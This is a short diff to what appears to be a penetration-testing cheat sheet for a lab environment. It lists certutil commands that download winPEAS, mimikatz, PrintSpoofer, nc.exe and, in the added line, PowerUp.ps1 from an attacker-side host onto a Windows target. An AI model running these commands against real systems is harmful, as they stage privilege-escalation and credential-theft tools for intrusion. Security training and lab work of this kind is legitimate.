@@ -28,6 +28,8 @@ certutil -urlcache -split -f http://10.10.14.160:8080/winPEASx64.exe
 certutil -urlcache -split -f http://10.10.14.160:8080/mimikatz.exe
 certutil -urlcache -split -f http://10.10.14.160:8080/PrintSpoofer.exe
 certutil -urlcache -split -f http://10.10.14.160:8080/nc.exe
+certutil -urlcache -split -f http://10.10.14.160:8080/PowerUp.ps1
+
 
 ```
 
